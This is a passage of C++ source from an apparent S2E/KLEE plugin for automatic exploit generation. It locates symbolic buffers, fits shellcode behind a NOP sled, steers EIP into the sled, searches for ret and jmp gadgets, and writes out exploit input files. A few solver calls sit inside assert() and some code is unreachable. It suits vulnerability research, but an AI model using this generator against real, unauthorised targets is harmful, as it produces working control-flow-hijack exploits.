                    while(objectOffset < objectSize && objectBase + objectOffset <= end) {
                        if(op.second->isByteKnownSymbolic(objectOffset) && !isa<klee::ConstantExpr>(op.second->read8(objectOffset))) {
                            uint32_t symbolicStart = objectBase + objectOffset;
                            while(objectOffset < objectSize && objectBase + objectOffset <= end &&
                                    op.second->isByteKnownSymbolic(objectOffset) && 
                                    !isa<klee::ConstantExpr>(op.second->read8(objectOffset))) {
                                objectOffset++;
                            }
                            uint32_t symbolicEnd = objectBase + objectOffset;
                            uint32_t symbolicSize = symbolicEnd - symbolicStart;

                            if(!sym_table.empty() 
                                    && symbolicStart == sym_table.back().addr + sym_table.back().size) {
                                sym_table.back().size += symbolicSize;
                            }
                            else {
                                MemBlock sa(symbolicStart, symbolicSize);
                                sym_table.push_back(sa);
                            }
                        }
                        else {
                            objectOffset++;
                        }
                    }
                }
                /* -mhhuang- Start from next ram object */
                virtualAddress = ((virtualAddress + S2E_RAM_OBJECT_SIZE) & S2E_RAM_OBJECT_MASK);
            }
            else {
                /* -mhhuang- Page fault, start from next page */
                virtualAddress = ((virtualAddress + TARGET_PAGE_SIZE) & TARGET_PAGE_MASK);
            }
        }

        BlockSizeSet symSet(sym_table.begin(), sym_table.end());
        return symSet;
    }

    Exploit::BlockSizeSet Exploit::searchExceptFutureStack(S2EExecutionState *state) {
        s2e()->getWarningsStream(state) << "Search symbolic array.." << std::endl;

        uint32_t esp = *(state->esp);
#ifdef __MHHUANG_DISCARD_KERNEL__
        BlockSizeSet set1 = searchSymbolicArray(state, esp, KERNEL_SPACE);
#else
        BlockSizeSet set1 = searchSymbolicArray(state, esp, 0xffffffff);
#endif
        /* Just leave 1024 byte for future function call */
        BlockSizeSet set2 = searchSymbolicArray(state, 0, esp-1024);
        set2.insert(set1.begin(), set1.end());

        s2e()->getWarningsStream(state) << set2.size() << " symbolic array is found:" << std::endl;
        for(BlockSizeSetIter it=set2.begin(); it!=set2.end(); it++) {
            s2e()->getWarningsStream(state) << "(0x" << std::hex << it->addr << ", " << std::dec << it->size << ")" << std::endl;
        }

        return set2;
    }

    void Exploit::addBlockRange(BlockAddrSet &addrSet, uint32_t start, uint32_t end) {
        BlockAddrSetIter it = addrSet.lower_bound(MemBlock(start, 1));
        if(it != addrSet.begin()) {
            it--;
            if(it->addr+it->size < start) {
                it++;
            }
        }

        while(it!=addrSet.end() && (it->addr<=end+1 || end==0xffffffff)) {
            uint32_t currStart = it->addr;
            uint32_t currEnd = it->addr+it->size-1;

            if(currStart < start)
                start = currStart;
            if(currEnd > end)
                end = currEnd;

            BlockAddrSetIter it2 = it;
            it++;
            addrSet.erase(it2);
        }

        addrSet.insert(MemBlock(start, end-start+1));
    }

    void Exploit::deleteBlockRange(BlockAddrSet &addrSet, uint32_t start, uint32_t end) {
        BlockAddrSetIter it = addrSet.upper_bound(MemBlock(start, 1));
        if(it != addrSet.begin())
            it--;
        while(it!=addrSet.end() && it->addr<=end) {
            uint32_t currStart = it->addr;
            uint32_t currEnd = it->addr+it->size-1;
            BlockAddrSetIter it2 = it;
            it++;

            if(currStart>=start && currEnd<=end) {
                addrSet.erase(it2);
                continue;
            }
            if(currStart<start && currEnd>=start) {
                addrSet.erase(it2);
                it2 = addrSet.end();
                addrSet.insert(MemBlock(currStart, start-currStart));
            }
            if(currEnd>end && currStart<=end) {
                if(it2 != addrSet.end())
                    addrSet.erase(it2);
                addrSet.insert(MemBlock(end+1, currEnd-end));
            }
        }
    }

    bool Exploit::isOverlap(BlockAddrSet &addrSet, uint32_t start, uint32_t end) {
        assert(start<=end && "Misuse of isOverlap()");

        BlockAddrSetIter it = addrSet.upper_bound(MemBlock(start, 1));
        if(it != addrSet.begin())
            it--;
        while(it != addrSet.end() && it->addr<=end) {
            uint32_t currStart = it->addr;
            uint32_t currEnd = it->addr+it->size-1;
 
            if(currStart < start) {
                if(currEnd >= start) {
                    return true;
                }
            }
            else {
                if(currStart <= end) {
                    return true;
                }
            }

            it++;
        }

        return false;
    }

    uint32_t Exploit::findEnoughLenBefore(BlockAddrSet &addrSet, uint32_t addr, uint32_t len) {
        BlockAddrSetIter it = addrSet.lower_bound(MemBlock(addr, 1));
        if(it != addrSet.begin()) {
            it--;
            while(1) {
                if(it->size >= len) {
                    uint32_t enoughLenStart = it->addr+it->size-len;
                    if(enoughLenStart < addr) {
                        return enoughLenStart;
                    }
                    else {
                        return addr-1;
                    }
                }
                else {
                    if(it == addrSet.begin()) {
                        break;
                    }
                    else {
                        it--;
                    }
                }
            }
        }
        
        return 0;
    }

    std::vector<unsigned char> Exploit::getShellcode(std::string shellcode) {
        std::vector<unsigned char> code;

        char *c_shellcode = new char [shellcode.size() + 1];
        strcpy(c_shellcode, shellcode.c_str());

        char *ptr = c_shellcode;
        while(*ptr != 0) {
            if(*ptr == 'x') {
                ptr++;

                long int byte = 0;
                for(int i=0; i<2; i++) {
                    if(*ptr <= '9' && *ptr >= '0') {
                        byte = (byte << 4);
                        byte += (*ptr - '0');
                        ptr++;
                    }
                    else if(*ptr <='f' && *ptr >= 'a') {
                        byte = (byte << 4);
                        byte += (*ptr - 'a' + 0xa);
                        ptr++;
                    }
                    else {
                        break;
                    }
                }

                code.push_back(byte);
            }
            else {
                code.push_back((long int)(*ptr));
                ptr++;
            }

        }

        delete []c_shellcode;
        return code;

        char *p = strtok(c_shellcode, "x");

        while(p != NULL) {
            code.push_back(strtol(p, NULL, 16));
            p = strtok(NULL, "x");
        }

        return code;
    }

    int Exploit::testShellcode(S2EExecutionState *state, uint32_t shellCodeStartAddr, klee::ref<klee::Expr> symEIPValue, uint32_t symBufStartAddr) {
        int size = m_shellcodeVector.size();
        int i;

        klee::ref<klee::Expr> shellCodeConstraint = klee::ConstantExpr::create(0x1,klee::Expr::Bool);
        for(i=0 ; i<size ; i++) {
            klee::ref<klee::Expr> oneByte = klee::EqExpr::create(state->readMemory8(shellCodeStartAddr + i), klee::ConstantExpr::create(m_shellcodeVector[i] ,klee::Expr::Int8));
            shellCodeConstraint = klee::AndExpr::create(shellCodeConstraint, oneByte);
        }

        bool res = mayBeTrue(state, shellCodeConstraint);
        if(res == false) {
            //s2e()->getWarningsStream(state) << "0x" << std::hex << shellCodeStartAddr << " can't be shellcode start" << std::endl;
            return -1;
        }
        else {
            //s2e()->getWarningsStream(state) << "0x" << std::hex << shellCodeStartAddr << " can be shellcode start" << std::endl;
            return testAndGetNopSize(state, shellCodeStartAddr, symBufStartAddr, symEIPValue, shellCodeConstraint);
        }
    }

    int Exploit::testAndGetNopSize(S2EExecutionState *state, uint32_t start, uint32_t end, klee::ref<klee::Expr> symEIPValue, klee::ref<klee::Expr> shellCodeConstraint) {
        /*
            End                           Start
             V                              V
             *******************************ShellCode
         */
        uint32_t min = end;
        uint32_t max = start;
        uint32_t mid = min + (max-min)/2;

#ifdef __MHHUANG_HEAP_OVERFLOW__
        /* This is the case-by-case code for heap overflow, in addition, one should use the heap
           shellcode in craxconfig.lua */
        min = start;
        mid = start;
#endif

        int nop_size = -1;
        /* Maybe we should check whether EIP can point to min~max first */
        while(min <= max) {
            klee::ref<klee::Expr> low = klee::UgeExpr::create(symEIPValue, klee::ConstantExpr::create(mid ,klee::Expr::Int32));
            klee::ref<klee::Expr> up = klee::UleExpr::create(symEIPValue, klee::ConstantExpr::create(start ,klee::Expr::Int32)); 
            klee::ref<klee::Expr> eipConstraint = klee::AndExpr::create(low, up);

            /* Check the range of eip */
            bool res = mayBeTrue(state, eipConstraint);
            /* MODIFY:
               The binary search may have some flaw, because it checks the NOP constraint together with EIP constraint
               whenever we loosen the constraints on EIP(widen the range), we must put more NOP; and when we loosen the
               constraint on NOP(put less NOP), we must tighten the constraint on EIP(narrow the range)
               But the concept of binary search is: first search the middle, if success, tighten the constraint, otherwise
               loosen the constraint, and search again. But when we try to loosen the NOP constraint, we have to tighten 
               the EIP constraint, which is a conflict 
             */
            if(res == true) {
                klee::ref<klee::Expr> exploitConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);
                for(uint32_t address = start-1; address >= mid; address--) {
                    klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address), klee::ConstantExpr::create(NOP_VALUE ,klee::Expr::Int8));
                    exploitConstraint = klee::AndExpr::create(exploitConstraint, nop);
                }
                exploitConstraint = klee::AndExpr::create(exploitConstraint, eipConstraint);
                exploitConstraint = klee::AndExpr::create(exploitConstraint, shellCodeConstraint);
                /* Check whether eip range and nop-sled can both be satisfied */
                res = mayBeTrue(state, exploitConstraint);  
                if(res == true) {
                    nop_size = start - mid;
                    max = mid - 1;
                }
                else {
                    min = mid + 1;
                    /* If this case can not be better than previous case, then it's no need to continue */
                    if(start-min < m_prevNopSize) {
                        break;
                    }
                }
            }
            else {
                max = mid - 1;
            }

            mid = min + (max-min)/2;
        }

        return nop_size;
    }

    void Exploit::addConstraints(S2EExecutionState *state, klee::ref<klee::Expr> symEIPValue, uint32_t shellcodeStartAddr, int nop_size) {
        klee::ref<klee::Expr> shellCodeAndNopConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);

        for(unsigned int i=0; i<m_shellcodeVector.size(); i++) {
            klee::ref<klee::Expr> one_byte =  klee::EqExpr::create(state->readMemory8(shellcodeStartAddr+i), 
                    klee::ConstantExpr::create(m_shellcodeVector[i], klee::Expr::Int8));
            shellCodeAndNopConstraint = klee::AndExpr::create(shellCodeAndNopConstraint, one_byte);;
        }

        for(unsigned int i=1; i<=(unsigned)nop_size; i++) {
            klee::ref<klee::Expr> nop = klee::EqExpr::create(state->readMemory8(shellcodeStartAddr-i), 
                    klee::ConstantExpr::create(NOP_VALUE ,klee::Expr::Int8));
            shellCodeAndNopConstraint = klee::AndExpr::create(shellCodeAndNopConstraint, nop);
        }

        s2e()->getWarningsStream(state) << "Insert shellcode at 0x" << std::hex << shellcodeStartAddr-nop_size << ", nop size: " << std::dec << nop_size << std::endl;

        state->addTempConstraint(shellCodeAndNopConstraint);

        /* Manage to point EIP in the middle of NOP */
        uint32_t leftBound = shellcodeStartAddr-nop_size;
        uint32_t rightBound = shellcodeStartAddr;
        uint32_t target = leftBound+(rightBound-leftBound)/2;
        uint32_t range = 0;

        /* First check if we can just point EIP to target */
        klee::ref<klee::Expr> bestCase = klee::EqExpr::create(symEIPValue, klee::ConstantExpr::create(target, klee::Expr::Int32));
        if(!mayBeTrue(state, bestCase)) {
            /* If we can't, then we should use binary search to find the nearest point */
            /* We can ensure that EIP can point to target-rangeUpperBound ~ target+rangeUpperBound,
               since this is tested in testAndGetNopSize */
            uint32_t rangeLowerBound = 0;
            uint32_t rangeUpperBound = rightBound-target;
            while(rangeLowerBound < rangeUpperBound) {
                range = (rangeUpperBound+rangeLowerBound)/2;
                klee::ref<klee::Expr> eipLowerBound = klee::UgeExpr::create(symEIPValue, klee::ConstantExpr::create(target-range, klee::Expr::Int32));
                klee::ref<klee::Expr> eipUpperBound = klee::UleExpr::create(symEIPValue, klee::ConstantExpr::create(target+range, klee::Expr::Int32));
                klee::ref<klee::Expr> eipBound = klee::AndExpr::create(eipLowerBound, eipUpperBound);
                if(mayBeTrue(state, eipBound)) {
                    rangeUpperBound = range;
                }
                else {
                    rangeLowerBound = range+1;
                }
            }
            range = rangeUpperBound;
        }
        leftBound = leftBound > target-range ? leftBound : target-range;
        rightBound = target+range;
        state->addTempConstraint(klee::UgeExpr::create(symEIPValue, klee::ConstantExpr::create(leftBound, klee::Expr::Int32)));
        state->addTempConstraint(klee::UleExpr::create(symEIPValue, klee::ConstantExpr::create(rightBound, klee::Expr::Int32)));

        s2e()->getWarningsStream(state) << "Point EIP between 0x" << std::hex << leftBound << " and 0x" << rightBound << std::endl;
    }

    /* Return the maximum NOP size we can fill, and the shellcode address we can use (this is returned by parameter) */
    int Exploit::getMaxNopAndAddr(S2EExecutionState *state, klee::ref<klee::Expr> symEIPValue, const char where[], uint32_t *r_shellCodeStart) {
        *r_shellCodeStart = 0;
        m_prevNopSize = -1;
        for(BlockSizeSetIter it=m_symSizeSet.begin(); it!=m_symSizeSet.end(); it++) {
            int64_t symArrayStartAddr = it->addr;
            int64_t symArraySize = it->size;

            bool printSolution = true;
            //std::cout << "Inspecting array 0x" << std::hex << it->addr << std::endl;

            /* First check if EIP can point into this symbolic array */
            klee::ref<klee::Expr> eipLowerBound = klee::UgeExpr::create(symEIPValue, klee::ConstantExpr::create(symArrayStartAddr, klee::Expr::Int32));
            klee::ref<klee::Expr> eipUpperBound = klee::UleExpr::create(symEIPValue, klee::ConstantExpr::create(symArrayStartAddr+symArraySize-1, klee::Expr::Int32));
            klee::ref<klee::Expr> eipBound = klee::AndExpr::create(eipLowerBound, eipUpperBound);
            if(!mayBeTrue(state, eipBound)) {
                //s2e()->getWarningsStream(state) << "EIP can't point to the symbolic array: 0x" << std::hex << symArrayStartAddr << 
                //                                                    ", size: " << std::dec << symArraySize << std::endl;
                continue;
            }

            int64_t shellcodeStartAddr = symArrayStartAddr + symArraySize - m_shellcodeVector.size();
            while(shellcodeStartAddr - symArrayStartAddr > m_prevNopSize) {
                int64_t newNopSize = testShellcode(state, shellcodeStartAddr, symEIPValue, it->addr);
                if(newNopSize != -1) {
                    if(m_prevNopSize < newNopSize) {
                        if(printSolution) {
                            s2e()->getWarningsStream(state) << "A solution with nop size " << newNopSize << " is found, shellCodeStart: 0x" << std::hex << shellcodeStartAddr  << std::endl;
                            printSolution = false;
                        }
                        *r_shellCodeStart = shellcodeStartAddr;
                        m_prevNopSize = newNopSize;

#ifdef __MHHUANG_HEAP_OVERFLOW__
                        /* This is the case-by-case code for heap overflow, in addition, one must
                           use the heap shellcode in craxconfig.lua */
                        return m_prevNopSize;
#endif
                    }
                    /* MODIFY:
                       Next ShellCode start
                       V
                     *********************NOPNOPNOPShellCode 

                     But we are not sure that the below case will be better?

                     ***********NOPNOPNNOPNOPShellCode******

                     Maybe put the shell code in the other place will let we put more NOP?
                     */
                    if(((shellcodeStartAddr - newNopSize) - symArrayStartAddr) <= (m_shellcodeVector.size() + m_prevNopSize))
                        break;
                    else
                        shellcodeStartAddr = shellcodeStartAddr - newNopSize;
                }
                shellcodeStartAddr--;
            }
        }

        return m_prevNopSize;
    }

    void Exploit::genExploit(S2EExecutionState *state, const char* filename) {
        ConcreteInputs symOut;
        bool success = s2e()->getExecutor()->getSymbolicSolution(*state, symOut);
        assert(success && "getSymbolicSolution fail!");

        std::ostringstream oss;
        oss << filename << "_" << state->getID();
        char *exploitPath = const_cast<char*> (s2e()->getOutputFilename(oss.str().c_str()).c_str());

        std::ofstream fsExploit(exploitPath, std::ios::out | std::ios::binary);

        /* Doesn't use the selective functionality, the whole input block is symbolized to
           one symbolic array */
        if(m_offsetSymMap.empty()) {
            ConcreteInputs::iterator it;
            for (it = symOut.begin(); it != symOut.end(); ++it) {
                const VarValuePair &vp = *it;
#ifdef __KS_MHHUANG_SYM_READ__
                std::string name = vp.first;
                /* Dont' output pseudo variables */
                if(name.find(KS_PSEUDO_VAR_PREFIX) == 0) {
                    continue;
                }
#endif
                for (unsigned i=0; i<vp.second.size(); ++i) {
                    fsExploit.put((unsigned) vp.second[i]);
                }
            }
        }
        else {
            char *inputPath = const_cast<char*> (s2e()->getOutputFilename("OriginalInput").c_str());
            std::ifstream fsOriginalInput(inputPath, std::ios::in | std::ios::binary);
            assert(!fsOriginalInput.fail() && "Input file open error");

            int symStart=-1, symEnd=-1;
            std::vector<unsigned char> symBlock;
            /* The std::map will sort the entries by their key, so the begin contains the smallest offset */
            std::map<uint32_t, std::string>::iterator offsetIt = m_offsetSymMap.begin();

            /* i is the current write index of output exploit, symStart, symEnd is the boundary 
               of current symbolic block, as the following illustrated:

               |***********************************|   => Concrete input
                  |xxxx|    |xxxxxxxxxxx|              => Symbolic blocks
                            ^     ^     ^
                        symStart  i   symEnd

               |***xxxx******xxxxx                     => The part of exploit that already outputted
             */
            for(int i=0; i<(int)m_inputSize; i++) {
                /* A block is completely outputted, and there are other blocks, search
                   for next block */
                if(i>symEnd && offsetIt!=m_offsetSymMap.end()) {
                    std::string symName = offsetIt->second;

                    ConcreteInputs::iterator symOutIt;
                    for(symOutIt=symOut.begin(); symOutIt!=symOut.end(); symOutIt++) {
                        if(symOutIt->first.compare(symName) == 0) {
                            symBlock = symOutIt->second;
                            symStart = offsetIt->first;
                            symEnd = symStart+symBlock.size()-1;
                            break;
                        }
                    }
                    assert(symOutIt!=symOut.end() && "Error! No matching symbolic array!");

                    offsetIt++;
                }

                int concreteByte = fsOriginalInput.get();
                if(i>=symStart && i<=symEnd) {
                    fsExploit.put(symBlock[i-symStart]);
                }
                else {
                    fsExploit.put(concreteByte);
                }
            }

            fsOriginalInput.close();
        }

        fsExploit.close();

        s2e()->getWarningsStream(state) << "[*] Generated Exploit. (" << filename << ")"<< std::endl;

        state->end = times(&(state->t_end));
        long tps = sysconf(_SC_CLK_TCK); 

        s2e()->getWarningsStream(state) << "Generate time : " << std::fixed << std::setprecision(5) << (float)(state->end - state->middle)/tps << std::endl;
        // s2e()->getWarningsStream(state) << "parent time (user CPU) : " << (float)(state->t_end.tms_utime - state->t_start.tms_utime)/tps << std::endl;
        // s2e()->getWarningsStream(state) << "parent time (sys CPU) : " << (float)(state->t_end.tms_stime - state->t_start.tms_stime)/tps << std::endl;
        // s2e()->getWarningsStream(state) << "child time (user CPU) : " << (float)(state->t_end.tms_cutime - state->t_start.tms_cutime)/tps << std::endl;
        // s2e()->getWarningsStream(state) << "child time (sys CPU) : " << (float)(state->t_end.tms_cstime - state->t_start.tms_cstime)/tps << std::endl;
    }

    uint32_t Exploit::findMaximum(S2EExecutionState *state, klee::ref<klee::Expr> expr) {
        uint32_t min = 0;
        uint32_t max = 0xff;
        while(min < max) {
            uint32_t mid = min+(max-min)/2+(max-min)%2;
            klee::ref<klee::Expr> canBeGreaterOrEqual = klee::UgeExpr::create(expr, klee::ConstantExpr::create(mid, klee::Expr::Int8));
            if(mayBeTrue(state, canBeGreaterOrEqual)) {
                min = mid;
            }
            else {
                max = mid-1;
            }
        }

        assert(min == max && "findMaximum false");
        return min;;
    }

    uint32_t Exploit::findMinimum(S2EExecutionState *state, klee::ref<klee::Expr> expr) {
        uint32_t min = 0;
        uint32_t max = 0xff;
        while(min < max) {
            uint32_t mid = min+(max-min)/2;
            klee::ref<klee::Expr> canBeLowerOrEqual = klee::UleExpr::create(expr, klee::ConstantExpr::create(mid, klee::Expr::Int8));
            if(mayBeTrue(state, canBeLowerOrEqual)) {
                max = mid;
            }
            else {
                min = mid+1;
            }
        }

        assert(min == max && "findMinimum false");
        return min;;
    }

    /* This function return the first return instruction in address range [min, max] that is pointable by symbolic EIP */
    uint32_t Exploit::findFeasibleRet(S2EExecutionState *state, klee::ref<klee::Expr> ptr, uint32_t min, uint32_t max) {
        if(min == max) {
            uint8_t byte;
            bool ok = state->readMemoryConcrete(min, &byte, 1);
            if(ok && byte==0xc3) {
                klee::ref<klee::Expr> equal = klee::EqExpr::create(ptr, klee::ConstantExpr::create(min, klee::Expr::Int32));
                if(mayBeTrue(state, equal)) {
                    s2e()->getWarningsStream(state) << "0x" << std::hex << min << " contains ret instruction" << std::endl;
                    return min;
                }
            }
        }
        else if(min < max) {
            if(isOverlap(m_mappedAddrSet, min, max)) {
                bool worthExplore = true;
                /* This is the (empirical) threshold to activate linear search */
                if(max-min < 1000) {
                    worthExplore = false;
                    for(uint32_t addr=min; addr<=max; addr++) {
                        uint8_t byte;
                        bool ok = state->readMemoryConcrete(addr, &byte, 1);
                        if(ok && byte==0xc3) {
                            worthExplore = true;
                            break;
                        }
                    }
                }

                if(worthExplore) {
                    klee::ref<klee::Expr> lowerBound = klee::UgeExpr::create(ptr, klee::ConstantExpr::create(min, klee::Expr::Int32));
                    klee::ref<klee::Expr> upperBound = klee::UleExpr::create(ptr, klee::ConstantExpr::create(max, klee::Expr::Int32));
                    klee::ref<klee::Expr> rangeBound = klee::AndExpr::create(lowerBound, upperBound);
                    if(mayBeTrue(state, rangeBound)) {
                        uint32_t mid = min+(max-min)/2;
                        uint32_t res;
                        res = findFeasibleRet(state, ptr, min, mid);
                        if(res != 0)
                            return res;
                        res = findFeasibleRet(state, ptr, mid+1, max);
                        if(res != 0)
                            return res;
                    }
                    else {
                        std::cout << "[Find RET] Range 0x" << std::hex << min << "-0x" << max << " can't be pointed" << std::endl;
                    }
                }
                else {
                    std::cout << "[Find RET] Range 0x" << std::hex << min << "-0x" << max << " don't contains ret instruction" << std::endl; 
                }
            }
            else {
                std::cout << "[Find RET] Range 0x" << std::hex << min << "-0x" << max << " is not mapped" << std::endl;
            }
        }

        return 0;
    }

    uint32_t Exploit::findFeasibleJmp(S2EExecutionState *state, klee::ref<klee::Expr> ptr, uint32_t min, uint32_t max) {
        if(isOverlap(m_jmpAddrSet, min, max)) {
            if(min == max) {
                klee::ref<klee::Expr> equal = klee::EqExpr::create(ptr, klee::ConstantExpr::create(min, klee::Expr::Int32));
                if(mayBeTrue(state, equal)) {
                    return min;
                }
            }
            else if(min < max) {
                klee::ref<klee::Expr> lowerBound = klee::UgeExpr::create(ptr, klee::ConstantExpr::create(min, klee::Expr::Int32));
                klee::ref<klee::Expr> upperBound = klee::UleExpr::create(ptr, klee::ConstantExpr::create(max, klee::Expr::Int32));
                klee::ref<klee::Expr> rangeBound = klee::AndExpr::create(lowerBound, upperBound);
                if(mayBeTrue(state, rangeBound)) {
                    uint32_t mid = min+(max-min)/2;
                    uint32_t res;
                    res = findFeasibleJmp(state, ptr, min, mid);
                    if(res != 0)
                        return res;
                    res = findFeasibleJmp(state, ptr, mid+1, max);
                    if(res != 0)
                        return res;
                }
                else {
                    std::cout << "[Find JMP] Range 0x" << std::hex << min << "-0x" << max << " can't be pointed" << std::endl;
                }
            }
        }
        else {
            std::cout << "[Find JMP] Range 0x" << std::hex << min << "-0x" << max << " don't contains JMP instruction" << std::endl; 
        }

        return 0;
    }

    void Exploit::printFeasibleSymbolic(S2EExecutionState *state, klee::ref<klee::Expr> expr, uint32_t min, uint32_t max, BlockAddrSet &symBlocks) {
        if(isOverlap(symBlocks, min, max)) {
            if(min == max) {
                klee::ref<klee::Expr> equal = klee::EqExpr::create(expr, klee::ConstantExpr::create(min, klee::Expr::Int32));
                if(mayBeTrue(state, equal)) {
                    s2e()->getWarningsStream(state) << "0x" << std::hex << min << " is a feasible symbolic cell" << std::endl;
                }
            }
            else if(min < max) {
                klee::ref<klee::Expr> lowerBound = klee::UgeExpr::create(expr, klee::ConstantExpr::create(min, klee::Expr::Int32));
                klee::ref<klee::Expr> upperBound = klee::UleExpr::create(expr, klee::ConstantExpr::create(max, klee::Expr::Int32));
                klee::ref<klee::Expr> rangeBound = klee::AndExpr::create(lowerBound, upperBound);
                if(mayBeTrue(state, rangeBound)) {
                    uint32_t mid = min+(max-min)/2;
                    printFeasibleSymbolic(state, expr, min, mid, symBlocks);
                    printFeasibleSymbolic(state, expr, mid+1, max, symBlocks);
                }
                else {
                    std::cout << "[Find SYM] Range 0x" << std::hex << min << "-0x" << max << " can't be pointed" << std::endl;
                }
            }
        }
        else {
            std::cout << "[Find SYM] Range 0x" << std::hex << min << "-0x" << max << " don't contains symbolic cell" << std::endl; 
        }
    }

    void Exploit::printPossibleByteCountInRange(S2EExecutionState *state, uint32_t start, uint32_t end) {
        for(uint32_t addr=start; addr<=end; addr++) {
            klee::ref<klee::Expr> byte = state->readMemory(addr, klee::Expr::Int8);
            if(byte.get() == NULL) {
                s2e()->getWarningsStream(state) << "0x" << std::hex << addr << ": Page fault" << std::endl;
            }
            else {
                s2e()->getWarningsStream(state) << "0x" << std::hex << addr << ": " 
                                                        << std::dec << getPossibleByteCount(state, byte, 0, 255) << std::endl;
            }
        }
    }

    uint32_t Exploit::getPossibleByteCount(S2EExecutionState *state, klee::ref<klee::Expr> expr, uint8_t min, uint8_t max) {
        uint32_t byteCount = 0;
        if(min == max) {
            klee::ref<klee::Expr> equal = klee::EqExpr::create(expr, klee::ConstantExpr::create(min, klee::Expr::Int8));
            if(mayBeTrue(state, equal)) {
                s2e()->getMessagesStream(state) << "Possible: 0x" << std::hex << (uint32_t)min << std::endl;
                return 1;
            }
        }
        else if(min < max) {
            klee::ref<klee::Expr> lowerBound = klee::UgeExpr::create(expr, klee::ConstantExpr::create(min, klee::Expr::Int8));
            klee::ref<klee::Expr> upperBound = klee::UleExpr::create(expr, klee::ConstantExpr::create(max, klee::Expr::Int8));
            klee::ref<klee::Expr> rangeBound = klee::AndExpr::create(lowerBound, upperBound);
            if(mayBeTrue(state, rangeBound)) {
                uint8_t mid = min+(max-min)/2;
                byteCount += getPossibleByteCount(state, expr, min, mid);
                byteCount += getPossibleByteCount(state, expr, mid+1, max);
            }
        }

        return byteCount;
    }

    bool Exploit::mayBeTrue(S2EExecutionState *state, klee::ref<klee::Expr> expr) {
        bool res;
        assert(s2e()->getExecutor()->getTimingSolver()->mayBeTrue(*state, expr, res) && "Solver error");
        return res;
    }

    bool Exploit::mustBeTrue(S2EExecutionState *state, klee::ref<klee::Expr> expr) {
        bool res;
        klee::Query query(state->constraints, expr);
        assert(s2e()->getExecutor()->getTimingSolver()->mustBeTrue(*state, expr, res) && "Solver error");
        return res;
    }

} // namespace plugins
} // namespace s2e

